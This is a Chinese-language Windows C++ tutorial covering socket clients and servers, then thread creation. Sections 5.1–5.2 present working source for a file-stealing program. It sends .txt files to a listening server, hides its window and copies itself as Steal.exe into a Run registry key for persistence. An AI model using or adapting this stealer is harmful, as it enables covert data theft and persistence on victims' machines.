		ret = MySocketSend0(sockCnt, (unsigned char*)message, strlen(message));
		printf("Message to client: ,ret = %d\n\n", ret);

		//6 关闭分机
		closesocket(sockCnt);
	}
	//7 关闭总机
	closesocket(sockServ);

	system("pause");
	return 0;
}

//循环接受超大数据
int MySocketRecv0(int sock, char* buf, int dataSize)
{
	int numsRecvSoFar = 0;//目前收到
	int numsRemainingToRecv = dataSize;//待接受大小
	printf("MySocketRecv0\n");

	while (1)
	{
		int bytesRead = recv(sock, buf + numsRecvSoFar, numsRemainingToRecv, 0);
		printf("###bytesRead = %d,numsRecvSoFar = %d, numsRemainingToRecv = %d\n", bytesRead, numsRecvSoFar, numsRemainingToRecv);
		if (bytesRead == numsRemainingToRecv)
		{
			return 0;//一次读完
		}
		else if (bytesRead > 0)//需要继续读
		{
			numsRecvSoFar += bytesRead;
			numsRemainingToRecv -= bytesRead;
			continue;
		}
		else if (bytesRead < 0 && errno == EAGAIN)//11//发生错误或网络断开
		{
			continue;
		}
		else//其他返回
		{
			return -1;
		}
	}
}

//循环发送超大数据
int MySocketSend0(int socketNum, unsigned char* data, unsigned dataSize)
{
	unsigned numBytesSentSoFar = 0;
	unsigned numBytesRemainingToSend = dataSize;
	while (1)
	{
		int bytesSend = send(socketNum, (char const*)(&data[numBytesSentSoFar]), numBytesRemainingToSend, 0);
		if (bytesSend == numBytesRemainingToSend)
		{
			return 0;
		}
		else if (bytesSend > 0)
		{
			numBytesSentSoFar += bytesSend;
			numBytesRemainingToSend -= bytesSend;
			continue;
		}
		else if (bytesSend < 0 && errno == 11)
		{
			continue;
		}

		else
		{
			return -1;
		}
	}
}

#pragma warning(disable:4996)
int getCurrentTimeStr(char* strtime)
{
	// 基于当前系统的当前日期/时间
	time_t now = time(NULL);
	tm* ltm = localtime(&now);
	sprintf(strtime, "%2d:%2d:%2d", ltm->tm_hour, ltm->tm_min, ltm->tm_sec);
	return 0;
}
void ErrorHandling(const char* message)
{
	fputs(message, stderr);
	fputc('\n', stderr);
	char ch[64];
	getCurrentTimeStr(ch);
	printf("error num = %d, error time %s\n", ::GetLastError(), ch);
	system("pause");
	exit(-1);
}

```



📋基于`3.4.1`修改后的客户端：

- 新增解决报错 `C4996`：`#pragma warning(disable:4996)`【详见第九章】

```c++
#include <stdio.h>
#include <stdlib.h>
#include <WinSock2.h>

#include <time.h>//getCurrentTimeStr

#pragma comment(lib,"ws2_32.lib")

#define MAX_ARRAYSIZE (1024*1024*10)
char message[MAX_ARRAYSIZE];


int ClientConnect();
int MySocketRecv0(int sock, char* buf, int dateSize);
int MySocketSend0(int socketNum, unsigned char* data, unsigned dataSize);

void ErrorHandling(const char* message);
int getCurrentTimeStr(char* strtime);
void initArray(char c);


int main()
{
	ClientConnect();
	system("pause");
	return 0;
}

int ClientConnect()
{
	printf("TCP Client\n");
	//0 初始化网络库
	WSADATA wsaData;
	/* 进一步简化
	WORD wVersionRequested;

	wVersionRequested = MAKEWORD(1, 1);
	// 初始化套接字库
	if (WSAStartup(wVersionRequested, &wsaData) != 0)
	{
		ErrorHandling("WSAStartup() error!");
	}
	*/
	if (WSAStartup(MAKEWORD(1, 1), &wsaData) != 0)
	{
		ErrorHandling("WSAStartup() error!");
	}

	if (LOBYTE(wsaData.wVersion) != 1 || HIBYTE(wsaData.wVersion) != 1)
	{
		WSACleanup();
		return -1;
	}

	char ch[64] = { 0 };//存储时间
	initArray('c');

	//1 初始化套接字
	SOCKET  hsock = socket(AF_INET, SOCK_STREAM, 0);//tcp ipv4
	if (hsock == INVALID_SOCKET)
	{
		ErrorHandling("Server socket errno: %d\n");
	}
	getCurrentTimeStr(ch);//将当前时间存入ch
	printf("begin connect %s\n", ch);

	//2 connect 配置要连接的服务器
	SOCKADDR_IN addrServ;
	memset(&addrServ, 0, sizeof(addrServ));
	int szAddrCnt = sizeof(addrServ);

	addrServ.sin_family = AF_INET;
	addrServ.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
	addrServ.sin_port = htons(6000);

	//3 连接服务器
	if (SOCKET_ERROR == connect(hsock, (sockaddr*)&addrServ, sizeof(addrServ)))
	{
		ErrorHandling("connect ERROR\n");
		system("pause");//退出前等待
		return -1;
	}
	getCurrentTimeStr(ch);//将当前时间存入ch
	printf("after connect %s\n", ch);

	//4 收发数据
	int strLen = send(hsock, message, strlen(message) - 1, 0);
	printf("after send %d\n", strLen);

	int ret = MySocketRecv0(hsock, message, strlen(message) - 1);
	printf("Message from server: ,ret = %d\n", ret);
	if (strLen == -1)
		ErrorHandling("read() error!");

	getCurrentTimeStr(ch);
	printf("after recv %s\n", ch);



	//5 关闭套接字
	closesocket(hsock);
	//6 终止套接字
	WSACleanup();

	system("pause");
	return 0;
}



//循环接受超大数据
int MySocketRecv0(int sock, char* buf, int dataSize)
{
	int numsRecvSoFar = 0;//目前收到
	int numsRemainingToRecv = dataSize;//待接受大小
	printf("MySocketRecv0\n");

	while (1)
	{
		int bytesRead = recv(sock, buf + numsRecvSoFar, numsRemainingToRecv, 0);
		printf("###bytesRead = %d,numsRecvSoFar = %d, numsRemainingToRecv = %d\n", bytesRead, numsRecvSoFar, numsRemainingToRecv);
		if (bytesRead == numsRemainingToRecv)
		{
			return 0;//一次读完
		}
		else if (bytesRead > 0)//需要继续读
		{
			numsRecvSoFar += bytesRead;
			numsRemainingToRecv -= bytesRead;
			continue;
		}
		else if (bytesRead < 0 && errno == EAGAIN)//11//发生错误或网络断开
		{
			continue;
		}
		else//其他返回
		{
			return -1;
		}
	}
}

//循环发送超大数据
int MySocketSend0(int socketNum, unsigned char* data, unsigned dataSize)
{
	unsigned numBytesSentSoFar = 0;
	unsigned numBytesRemainingToSend = dataSize;
	while (1)
	{
		int bytesSend = send(socketNum, (char const*)(&data[numBytesSentSoFar]), numBytesRemainingToSend, 0);
		if (bytesSend == numBytesRemainingToSend)
		{
			return 0;
		}
		else if (bytesSend > 0)
		{
			numBytesSentSoFar += bytesSend;
			numBytesRemainingToSend -= bytesSend;
			continue;
		}
		else if (bytesSend < 0 && errno == 11)
		{
			continue;
		}

		else
		{
			return -1;
		}
	}
}
#pragma warning(disable:4996)//为避免下面的报错
//rror C4996: 'localtime': This function or variable may be unsafe. Consider using localtime_s instead. To disable deprecation, use _CRT_SECURE_NO_WARNINGS. See online help for details.
//error C4996: 'sprintf': This function or variable may be unsafe. Consider using sprintf_s instead. To disable deprecation, use _CRT_SECURE_NO_WARNINGS. See online help for details.
int getCurrentTimeStr(char* strtime)
{
	// 基于当前系统的当前日期/时间
	time_t now = time(NULL);
	tm* ltm = localtime(&now);
	sprintf(strtime, "%2d:%2d:%2d", ltm->tm_hour, ltm->tm_min, ltm->tm_sec);
	return 0;
}

void ErrorHandling(const char* message)
{
	fputs(message, stderr);
	fputc('\n', stderr);
	char ch[64];
	getCurrentTimeStr(ch);
	printf("error num = %d, error time %s\n", ::GetLastError(), ch);
	system("pause");
	exit(-1);
}

void initArray(char c)
{
	int i = 0;
	for (i = 0; i < MAX_ARRAYSIZE; i++)
	{
		message[i] = c;
	}
}
```



<br>

# 五 网络编程实战

## 5.1 网络编程实战之网络文件截取

![](W-5-1.png)

Windows文件结构体：

```C++
typedef WIN32_FIND_DATAA WIN32_FIND_DATA;

typedef struct _WIN32_FIND_DATAA {
    DWORD dwFileAttributes;		//文件属性
    FILETIME ftCreationTime;	//创建时间
    FILETIME ftLastAccessTime;	//最后访问时间
    FILETIME ftLastWriteTime;	//最后写时间
    DWORD nFileSizeHigh;		//文件大小的高位
    DWORD nFileSizeLow;			//文件大小的地位
    DWORD dwReserved0;			//保留字段
    DWORD dwReserved1;			//保留字段
    _Field_z_ CHAR   cFileName[ MAX_PATH ];		//文件名
    _Field_z_ CHAR   cAlternateFileName[ 14 ];	//改变后的文件名
}
```

### 5.1.1 客户端Client实现

```c++
#include <stdio.h>
#include <iostream>
#include <WinSock2.h>
#include <time.h>

#pragma comment(lib,"ws2_32.lib")
#pragma warning(disable:4996)

int DoSteal(const char*);
int SendtoServer(const char*);

void ErrorHandling(const char* message, int ERRNO);
int getCurrentTimeStr(char* strtime);

/*
*该程序被植入到某联网机器中用于窃取文件
*1.搜索被窃取的文件
*/

int main()
{
	printf("TCP Client\n");
	//窃取文件
	int ret_steal = DoSteal("E:\\About Chase\\Art of Programming-2024\\CPP\\test_f");

	system("pause");
	return 0;
}

int DoSteal(const char* szPATH)
{
	//1 遍历文件夹
	WIN32_FIND_DATA FindFileData;//表示文件
	HANDLE hListFile;//文件用句柄来标识和编号

	char szFilePath[MAX_PATH] = { 0 };//MAX_PATH=260 Windows下的宏，win下最大文件路径长度
	strcpy(szFilePath, szPATH);
	strcat(szFilePath, "\\*");//字符串拼接
	/*
		FindFirstFileA(	//LP标识指针
			_In_ LPCSTR lpFileName,//入参：路径
			_Out_ LPWIN32_FIND_DATAA lpFindFileData	//输出
		);
	*/
	//2 首先找到第一个文件,为 hListFile赋值
	hListFile = FindFirstFile(szFilePath, &FindFileData);
	//循环遍历所有文件
	do
	{
		char mypath[MAX_PATH] = { 0 };
		strcpy(mypath, szPATH);
		strcat(mypath, "\\");
		strcat(mypath, FindFileData.cFileName);
		printf("FileName:%s\n", mypath);
		if (strstr(mypath, ".txt"))//只截取txt文件
		{
			SendtoServer(mypath);
		}
	} while (FindNextFile(hListFile, &FindFileData));

	return 0;
}

int SendtoServer(const char* path)
{
	//1 初始化网络库
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)//2 2 表示WinSock2.h的二版本
	{
		ErrorHandling("WSAStartup() error!", WSAGetLastError());
	}
	if (LOBYTE(wsaData.wVersion) != 2 || HIBYTE(wsaData.wVersion) != 2)//2表示WinSock2.h的二版本
	{
		WSACleanup();
		return -1;
	}

	char ch[64] = { 0 };//存储时间
	char sendBuf[1024] = { 0 };

	//2 初始化套接字
	SOCKET  sock_cli = socket(AF_INET, SOCK_STREAM, 0);//TCP ipv4
	if (sock_cli == INVALID_SOCKET)
	{
		ErrorHandling("Server socket errno: %d\n", WSAGetLastError());
	}

	//3 准备发送地址和端口
	SOCKADDR_IN addrServ;
	int szAddrServ = sizeof(addrServ);
	memset(&addrServ, 0, sizeof(addrServ));

	addrServ.sin_family = AF_INET;
	addrServ.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
	addrServ.sin_port = htons(44444);

	//4 connect
	getCurrentTimeStr(ch);//将当前时间存入ch
	printf("Begin connect %s\n", ch);
	if (SOCKET_ERROR == connect(sock_cli, (sockaddr*)&addrServ, sizeof(addrServ)))
	{
		ErrorHandling("Server socket errno: %d\n", WSAGetLastError());
	}

	//5 读取文件内容到buffer
	FILE* fp = fopen(path, "rb");
	int len = fread(sendBuf, 1, 1024, fp);
	fclose(fp);

	//6 发送数据
	int strLen = sendto(sock_cli, sendBuf, strlen(sendBuf) + 1, 0, (sockaddr*)&addrServ, szAddrServ);
	printf("After send %d\n", strLen);
	if (strLen == -1)
		ErrorHandling("send error!", WSAGetLastError());

	getCurrentTimeStr(ch);
	printf("After send: %s\n", ch);

	//5 关闭套接字
	closesocket(sock_cli);
	//6 终止套接字
	WSACleanup();
	
	return 0;
}

int getCurrentTimeStr(char* strtime)
{
	// 基于当前系统的当前日期/时间
	time_t now = time(NULL);
	tm* ltm = localtime(&now);
	sprintf(strtime, "%2d:%2d:%2d", ltm->tm_hour, ltm->tm_min, ltm->tm_sec);
	return 0;
}

void ErrorHandling(const char* message, int ERRNO)
{
	fputs(message, stderr);
	fputc('\n', stderr);
	char ch[64];
	getCurrentTimeStr(ch);
	//printf("Error num = %d, Error time %s\n", ::GetLastError(), ch);
	printf("Error num = %d, Error time %s\n", ERRNO, ch);
	system("pause");
	exit(-1);
}
```



### 5.1.2 服务端实现

```c++
#include <stdio.h>
#include <iostream>
#include <WinSock2.h>
#include <time.h>

#pragma comment(lib,"ws2_32.lib")
#pragma warning(disable:4996)

#define MAX_SIZE 1024

int getCurrentTimeStr(char* strtime);
void ErrorHandling(const char* message, int ERRNO);


int main()
{
	printf("TCP Server\n");
	//1 初始化网络库
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(1, 1), &wsaData) != 0)//2表示WinSock2.h的二版本
	{
		ErrorHandling("WSAStartup() error!", WSAGetLastError());
	}
	if (LOBYTE(wsaData.wVersion) != 1 || HIBYTE(wsaData.wVersion) != 1)
	{
		WSACleanup();
		ErrorHandling("LOBYTE() error!", WSAGetLastError());
	}

	char ch[64] = { 0 };//存储时间

	//2 创建socket
	SOCKET  sockServ = socket(AF_INET, SOCK_STREAM, 0);//udp ipv4
	if (sockServ == INVALID_SOCKET)
	{
		ErrorHandling("Server socket Error!", WSAGetLastError());
	}

	//3 bind 分配地址和端口
	SOCKADDR_IN addrServ, addrClient;
	memset(&addrServ, 0, sizeof(addrServ));
	memset(&addrClient, 0, sizeof(addrClient));
	int szAddrCnt = sizeof(addrClient);

	addrServ.sin_family = AF_INET;
	addrServ.sin_addr.S_un.S_addr = htonl(INADDR_ANY);
	addrServ.sin_port = htons(44444);

	if (SOCKET_ERROR == bind(sockServ, (sockaddr*)&addrServ, sizeof(addrServ)))
	{
		ErrorHandling("Bind ERROR", WSAGetLastError());
	}

	//4 listen
	if (SOCKET_ERROR == listen(sockServ, 5))
	{
		ErrorHandling("listen ERROR", WSAGetLastError());
	}
	//3 等待收发数据【阻塞】[直接接到服务端socket]
	char recvBuf[MAX_SIZE] = { 0 };
	int strLen = 0;
	while (true)
	{
		SOCKET client = accept(sockServ, (sockaddr*)&addrClient, &szAddrCnt);
		if (SOCKET_ERROR == client)
		{
			ErrorHandling("accept ERROR", WSAGetLastError());
		}
		memset(recvBuf, 0, MAX_SIZE);
		while ((strLen = recv(client, recvBuf, MAX_SIZE, 0)) != 0)
		{
			printf("Server message: %s\n", recvBuf);
		}
		closesocket(client);
	}
	//7 关闭总机
	closesocket(sockServ);

	system("pause");
	return 0;
}



int getCurrentTimeStr(char* strtime)
{
	// 基于当前系统的当前日期/时间
	time_t now = time(NULL);
	tm* ltm = localtime(&now);
	sprintf(strtime, "%2d:%2d:%2d", ltm->tm_hour, ltm->tm_min, ltm->tm_sec);
	return 0;
}
void ErrorHandling(const char* message, int ERRNO)
{
	fputs(message, stderr);
	fputc('\n', stderr);
	char ch[64];
	getCurrentTimeStr(ch);
	//printf("Error num = %d, Error time %s\n", ::GetLastError(), ch);
	printf("Error num = %d, Error time %s\n", ERRNO, ch);
	system("pause");
	exit(-1);
}
```

注意：

- `<windows.h>` 与`<WinSock2.h>` 相互冲突
- `printf` 输出可能会因为缓存卡在某处，推荐使用`fputs`或`Linux`

> `printf` 与 `fputs`的区别：
>
> 1. `puts()`显示字符串时自动在其后添加一个换行符，函数里的参数是一个地址，从该地址向后面输出，直到遇到空字符，所以要确保输出的字符串里要有空字符。与`gets()`函数一起使用。
> 2. `fputs()`需要第二个参数来说明要写的文件，与`puts()`不同，`fputs()`不为输出自动添加换行符。与`fgets()`一起使用。
> 3. `printf()`格式化输入输出，与`gets()`函数一致需要一个字符串地址作为参数。

总结：

1. 只要是文件遍历，我们要立马想到`WIN32_FIND_DATA`结构体，其包含文件名和文件信息、创建时间、访问时间等

2. 句柄 --- 即指针，用来表示windows下面的一些对象

3. MAX_PATH 涉及到windows路径的数组变量 260

4. 禁用特定警告4996

5. 怎么样隐藏自身【`5.2`节】

6. 怎么样写入到注册表 【`5.2`节】

7. 错误处理函数

   ```c++
   void ErrorHanding(const char *msg)
   {
     fputs(msg, stderr);
     fputc('\n', stderr);
     exit(1);
   }
   ```

   



<br>

## 5.2 隐藏进程与修改注册表

对客户端的优化：写入注册表

```c++
#include <stdio.h>
#include <iostream>
#include <WinSock2.h>
#include <time.h>
#include <io.h>//_finddata_t

#pragma comment(lib,"ws2_32.lib")
#pragma warning(disable:4996)

int DoSteal(const char*);
int SendtoServer(const char*);

void ErrorHandling(const char* message, int ERRNO);
int getCurrentTimeStr(char* strtime);

void AddToSystem();
void HideMyself();

/*
*该程序被植入到某联网机器中用于窃取文件
*1.搜索被窃取的文件
*/

int main()
{
	// 隐藏自身
	HideMyself();
	// 添加到启动项
	AddToSystem();

	printf("TCP Client\n");
	//窃取文件
	int ret_steal = DoSteal("E:\\About Chase\\Art of Programming-2024\\CPP\\test_f");

	system("pause");
	return 0;
}

int DoSteal(const char* szPATH)
{
	//1 遍历文件夹
	WIN32_FIND_DATA FindFileData;//表示文件
	HANDLE hListFile;//文件用句柄来标识和编号

	char szFilePath[MAX_PATH] = { 0 };//MAX_PATH=260 Windows下的宏，win下最大文件路径长度
	strcpy(szFilePath, szPATH);
	strcat(szFilePath, "\\*");//字符串拼接
	/*
		FindFirstFileA(	//LP标识指针
			_In_ LPCSTR lpFileName,//入参：路径
			_Out_ LPWIN32_FIND_DATAA lpFindFileData	//输出
		);
	*/
	//2 首先找到第一个文件,为 hListFile赋值
	hListFile = FindFirstFile(szFilePath, &FindFileData);
	//循环遍历所有文件
	do
	{
		char mypath[MAX_PATH] = { 0 };
		strcpy(mypath, szPATH);
		strcat(mypath, "\\");
		strcat(mypath, FindFileData.cFileName);
		printf("FileName:%s\n", mypath);
		if (strstr(mypath, ".txt"))//只截取txt文件
		{
			SendtoServer(mypath);
		}
	} while (FindNextFile(hListFile, &FindFileData));

	return 0;
}

int SendtoServer(const char* path)
{
	//1 初始化网络库
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)//2 2 表示WinSock2.h的二版本
	{
		ErrorHandling("WSAStartup() error!", WSAGetLastError());
	}
	if (LOBYTE(wsaData.wVersion) != 2 || HIBYTE(wsaData.wVersion) != 2)//2表示WinSock2.h的二版本
	{
		WSACleanup();
		return -1;
	}

	char ch[64] = { 0 };//存储时间
	char sendBuf[1024] = { 0 };

	//2 初始化套接字
	SOCKET  sock_cli = socket(AF_INET, SOCK_STREAM, 0);//TCP ipv4
	if (sock_cli == INVALID_SOCKET)
	{
		ErrorHandling("Server socket errno: %d\n", WSAGetLastError());
	}

	//3 准备发送地址和端口
	SOCKADDR_IN addrServ;
	int szAddrServ = sizeof(addrServ);
	memset(&addrServ, 0, sizeof(addrServ));

	addrServ.sin_family = AF_INET;
	addrServ.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
	addrServ.sin_port = htons(44444);

	//4 connect
	getCurrentTimeStr(ch);//将当前时间存入ch
	printf("Begin connect %s\n", ch);
	if (SOCKET_ERROR == connect(sock_cli, (sockaddr*)&addrServ, sizeof(addrServ)))
	{
		ErrorHandling("Server socket errno: %d\n", WSAGetLastError());
	}

	//5 读取文件内容到buffer
	FILE* fp = fopen(path, "rb");
	int len = fread(sendBuf, 1, 1024, fp);
	fclose(fp);

	//6 发送数据
	int strLen = sendto(sock_cli, sendBuf, strlen(sendBuf) + 1, 0, (sockaddr*)&addrServ, szAddrServ);
	printf("After send %d\n", strLen);
	if (strLen == -1)
		ErrorHandling("send error!", WSAGetLastError());

	getCurrentTimeStr(ch);
	printf("After send: %s\n", ch);

	//5 关闭套接字
	closesocket(sock_cli);
	//6 终止套接字
	WSACleanup();
	
	return 0;
}

int getCurrentTimeStr(char* strtime)
{
	// 基于当前系统的当前日期/时间
	time_t now = time(NULL);
	tm* ltm = localtime(&now);
	sprintf(strtime, "%2d:%2d:%2d", ltm->tm_hour, ltm->tm_min, ltm->tm_sec);
	return 0;
}

void ErrorHandling(const char* message, int ERRNO)
{
	fputs(message, stderr);
	fputc('\n', stderr);
	char ch[64];
	getCurrentTimeStr(ch);
	//printf("Error num = %d, Error time %s\n", ::GetLastError(), ch);
	printf("Error num = %d, Error time %s\n", ERRNO, ch);
	system("pause");
	exit(-1);
}

void AddToSystem()
{
	HKEY  hKEY;
	char  CurrentPath[MAX_PATH];
	char  SysPath[MAX_PATH];
	long  ret = 0;
	LPSTR FileNewName;
	LPSTR FileCurrentName;
	DWORD type = REG_SZ;
	DWORD size = MAX_PATH;
	LPCTSTR Rgspath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"; //regedit  win + R

	GetSystemDirectory(SysPath, size);
	GetModuleFileName(NULL, CurrentPath, size);
	//Copy File
	FileCurrentName = CurrentPath;
	FileNewName = lstrcat(SysPath, "\\Steal.exe");//字符串拼接
	struct _finddata_t Steal;
	printf("ret1 = %d,FileNewName = %s\n", ret, FileNewName);
	if (_findfirst(FileNewName, &Steal) != -1)
		return;//已经安装！
	printf("ret2 = %d\n", ret);

	int ihow = MessageBox(0, "该程序只允许用于合法的用途！\n继续运行该程序将使这台机器处于被监控的状态！\n如果您不想这样，请按“取消”按钮退出。\n按下“是”按钮该程序将被复制到您的机器上，并随系统启动自动运行。\n按下“否”按钮，程序只运行一次，不会在您的系统内留下任何东西。", "警告", MB_YESNOCANCEL | MB_ICONWARNING | MB_TOPMOST);
	if (ihow == IDCANCEL)
		exit(0);

	if (ihow == IDNO)
		return;//只运行一次
	//复制文件
	ret = CopyFile(FileCurrentName, FileNewName, TRUE);
	if (!ret)
	{
		return;
	}
	//加入注册表【需要管理员权限】
	printf("ret = %d\n", ret);
	ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, Rgspath, 0, KEY_WRITE, &hKEY);
	if (ret != ERROR_SUCCESS)
	{
		RegCloseKey(hKEY);
		return;
	}
	//Set Key
	ret = RegSetValueEx(hKEY, "Steal", NULL, type, (const unsigned char*)FileNewName, size);
	if (ret != ERROR_SUCCESS)
	{
		RegCloseKey(hKEY);
		return;
	}
	RegCloseKey(hKEY);
}

void HideMyself()
{
	// 拿到当前的窗口句柄
	HWND hwnd = GetForegroundWindow();
	ShowWindow(hwnd, SW_HIDE);
}
```



 <br>

# 六 多线程

## 6.1基本概念

引入一个题目：

- 老师提了一个需求：打印
- 每隔3秒叫小红俯卧撑：持续20次
- 每隔4秒钟小明做一次甩头发：持续30次
- 每隔2秒钟叫老王唱歌：持续50次

```c++
#include <stdio.h>
#include <Windows.h>

//老师提了一个需求：打印
//每隔3秒叫小红俯卧撑:持续20次
//每隔4秒钟小明做一次甩头发:持续30次
//每隔2秒钟叫老王唱歌:持续50次
int main_hong(int count)
{
	for (int i = 0; i < count; i++)
	{
		printf("第%d次俯卧撑\n", i + 1);
		Sleep(3000);
	}
	return 0;
}
int main_ming(int count)
{
	for (int i = 0; i < count; i++)
	{
		printf("第%d次甩头\n", i + 1);
		Sleep(3000);
	}
	return 0;
}
int main_wang(int count)
{
	for (int i = 0; i < count; i++)
	{
		printf("第%d次唱歌\n", i + 1);
		Sleep(3000);
	}
	return 0;
}

int main()
{
	int count1 = 20, count2 = 30, count3 = 50;
	main_hong(count1);
	main_ming(count2);
	main_wang(count3);

	system("pause");
	return 0;
}
```

> 程序顺序执行，执行结束共需要时间为：`(3x20 + 4x30 + 2x50)s`

线程是在进程中产生的一个执行单元，是CPU调度和分配的最小单元，其在同一个进程中与其他线程并行运行，他们可以共享进程内的资源，比如内存、地址空间、打开的文件等等。

- **线程**是CPU调度和分派的基本单位【工人】
- **进程**是分配资源的基本单位【车间】

**进程**：正在运行的程序【狭义】。

【广义】进程是处于执行期的程序以及它所管理的资源（如打开的文件、挂起的信号、进程状态、地址空间等等）的总称。从操作系统核心角度来说，进程是操作系统调度除CPU时间片外进行的资源分配和保护的基本单位，它有一个独立的虚拟地址空间，用来容纳进程映像(如与进程关联的程序与数据)，并以进程为单位对各种资源实施保护，如受保护地访问处理器、文件、外部设备及其他进程(进程间通信) 。

<br>

<span style="background:#5de420;font-weight:bold;">如何理解进程和线程？</span>

- 计算机有很多资源组成，比如CPU、内存、磁盘、鼠标、键盘等，就像一个工厂由电力系统、作业车间、仓库、管理办公室和工人组成。

- 假定工厂的电力有限，一次只能供给一个或少量几个车间使用。也就是说，一部分车间开工的时候，其他车间都必须停工。背后的含义就是，单个CPU一次只能运行一个任务，多个CPU能够运行少量任务。

- 线程就好比车间里的工人。一个进程可以包括多个线程，他们协同完成某一个任务。


<br>

<span style="background:#5de420;font-weight:bold;">为什么使用多线程？</span>

- 避免阻塞：单个进程只有一个主线程，当主线程阻塞的时候，整个进程也就阻塞了，无法再去做其它的一些功能了。
- 避免CPU空转：应用程序经常会涉及到RPC，数据库访问，磁盘IO等操作，这些操作的速度比CPU慢很多，而在等待这些响应时，CPU却不能去处理新的请求，导致这种单线程的应用程序性能很差。【 cpu > 内存 > 磁盘】
- 提升效率：一个进程要独立拥有4GB的虚拟地址空间，而多个线程可以共享同一地址空间，线程的切换比进程的切换要快得多。

 <br>

## 6.2 线程创建函数

`CreateThread`是一种微软在[Windows API](https://learn.microsoft.com/zh-cn/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread?devlangs=cpp&f1url=%3FappId%3DDev17IDEF1%26l%3DZH-CN%26k%3Dk(THREAD1%252FCreateThread)%3Bk(CreateThread)%3Bk(DevLang-C%252B%252B)%3Bk(TargetOS-Windows)%26rd%3Dtrue)中提供了建立新的线程的函数，该函数在主线程的基础上创建一个新线程。线程终止运行后，线程对象仍然在系统中，必须通过`CloseHandle`函数来关闭该线程对象。

```c++
#include <windows.h>
#include <process.h>

HANDLE CreateThread(
    LPSECURITY_ATTRIBUTES lpThreadAttributes,//SD
    SIZE_T dwStackSize,//initialstacksize
    LPTHREAD_START_ROUTINE lpStartAddress,//threadfunction
    LPVOID lpParameter,//threadargument
    DWORD dwCreationFlags,//creationoption
    LPDWORD lpThreadId//threadidentifier
)
//第一个参数 lpThreadAttributes 表示线程内核对象的安全属性，一般传入NULL表示使用默认设置。
//第二个参数 dwStackSize 表示线程栈空间大小。传入0表示使用默认大小（1MB）。
//第三个参数 lpStartAddress 表示新线程所执行的线程函数地址，多个线程可以使用同一个函数地址。
//第四个参数 lpParameter 是传给线程函数的参数。
//第五个参数 dwCreationFlags 指定额外的标志来控制线程的创建
//------为0表示线程创建之后立即就可以进行调度；
//------如果为CREATE_SUSPENDED则表示线程创建后暂停运行，这样它就无法调度，直到调用ResumeThread()
//第六个参数 lpThreadId 将返回线程的ID号，传入NULL表示不需要返回该线程ID号
```



另一个线程创建函数【更常用】：`_beginthread` / `_beginthreadex`【常用后者】

```c++
#include <process.h>
//返回值:成功返回新线程句柄， 失败返回0
unsigned long _beginthreadex(
    void *security,  // 安全属性， 为NULL时表示默认安全性
    unsigned stack_size,  // 线程的堆栈大小， 一般默认为0
    unsigned(_stdcall *start_address)(void *),  // 线程函数
    void *argilist, // 线程函数的参数
    unsigned initflag,  // 新线程的初始状态，0表示立即执行，//CREATE_SUSPENDED表示创建之后挂起
    unsigned *threaddr  // 用来接收线程ID,使用NULL表示不接收
);
```

> `__stdcall`表示
>
> - 参数从右向左压入堆栈
> - 函数被调用者修改堆栈



**线程编码示例：**

```c++
#include <stdio.h>
#include <windows.h>
#include <process.h>

DWORD WINAPI ThreadFun(LPVOID p)
{
	int iMym = (int)p;
	printf("我是子线程，PID = %d,iMym = %d\n", GetCurrentThreadId(), iMym);
	return 0;
}

int main()
{
	printf("main begin\n");
	HANDLE hThread;
	DWORD dwThreadID;

	int m = 100;
	hThread = CreateThread(NULL, 0, ThreadFun, &m, 0, &dwThreadID);
	printf("我是主线程，PID = %d\n", GetCurrentThreadId());
	CloseHandle(hThread);
	Sleep(2000);

	system("pause");
	return 0;
}
```



<br>

## 6.3 简单多线程示例

### 6.3.1 理解内核对象

定义：**内核对象**通过API来创建，每个内核对象是一个数据结构，它对应一块内存，由操作系统内核分配，并且只能由操作系统内核访问。

- 在此数据结构中少数成员【如安全描述符 `security`、使用计数】是所有对象都有的，但其他大多数成员都是不同类型的对象特有的。
- 内核对象的数据结构只能由操作系统提供的API访问，应用程序在内存中不能访问。
- 调用创建内核对象的函数后，该函数会返回一个句柄，它标识了所创建的对象。它可以由进程的任何线程使用。
  - CreateProcess
  - CreateThread
  - CreateFile
  - event
  - Job
  - Mutex

常见的内核对象 : 进程、线程、文件，存取符号对象、事件对象、文件对象、作业对象、互斥对象、管道对象、等待计时器对象，邮件槽对象，信号对象

**内核对象**：为了管理线程/文件等资源而由操作系统创建的数据块，其创建的所有者肯定是操作系统。



### 6.3.2 举例

🔺第一个例子：主线程和子线程的结束时间【main函数返回后，整个进程终止，同时终止其包含的所有线程】

```c++
#include <stdio.h>
#include <windows.h>
#include <process.h>

DWORD WINAPI ThreadFun(LPVOID p)//DWORD：unsigned long 
{
	int iMym = *(int*)p;
	printf("我是子线程，PID = %d,iMym = %d\n", GetCurrentThreadId(), iMym);
	for (int i = 0; i < iMym; i++)
	{
		printf("sleep\n");
		Sleep(1000);
	}
	return 0;
}

int main()
{
	printf("main begin\n");
	HANDLE hThread;
	DWORD dwThreadID;

	int m = 100;
	hThread = CreateThread(NULL, 0, ThreadFun, &m, 0, &dwThreadID);//入口函数的取地址符&，可加可不加
	if (hThread == 0)
	{
		puts("CreateThread() error");
		return -1;
	}
	printf("我是主线程，PID = %d\n", GetCurrentThreadId());
	CloseHandle(hThread);

	Sleep(10000);
	system("pause");//注释后报错，因为主线程已结束，子线程还在继续
	return 0;
}
```



🔺第二个例子：`WaitForSingleObject()`【来等待一个内核对象变为已通知状态】

```c++
//主线程会阻塞在此处，直到等待时间到或子线程执行结束
WaitForSingleObject(
  _In_ HANDLE hHandle,  	//指明一个内核对象的句柄
  _In_ DWORD dwMilliseconds //等待时间
);
```

```c++
#include <stdio.h>
#include <windows.h>
#include <process.h>

DWORD WINAPI ThreadFun(LPVOID p)//DWORD：unsigned long 
{
	int iMym = *(int*)p;
	printf("我是子线程，PID = %d,iMym = %d\n", GetCurrentThreadId(), iMym);
	for (int i = 0; i < iMym; i++)
	{
		printf("sleep\n");
		Sleep(1000);
	}
	return 0;
}

int main()
{
	printf("main begin\n");
	HANDLE hThread;
	DWORD dwThreadID;
	DWORD wr;

	int m = 10;
